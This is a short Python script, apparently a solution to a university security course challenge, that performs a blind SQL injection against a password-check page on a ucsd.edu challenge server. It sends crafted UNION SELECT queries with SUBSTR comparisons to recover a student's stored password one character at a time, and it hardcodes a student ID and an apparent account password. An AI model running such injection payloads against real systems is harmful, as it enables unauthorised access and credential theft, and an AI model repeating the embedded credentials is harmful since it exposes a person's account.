import requests
import time
from string import ascii_lowercase

url = "https://c10-32.sysnet.ucsd.edu/challenges/level8_password/"
pid = "A15720503"
password = "WAaXqTNiaAoF9Lv8"

found = ""

for i in range(1, 9):
    for c in ascii_lowercase:
        query = "XXX') UNION SELECT * FROM students WHERE pid = '" + pid + "' AND SUBSTR(password, " + str(i) + ", 1) = '" + c + "' --"
        print(query)
        time.sleep(.75)
        response = requests.post(url, data={'pid':pid, 'entry_password':password, 'password': query})
        if "<p>success</p>" in response.text:
            found += c
            break
print(found)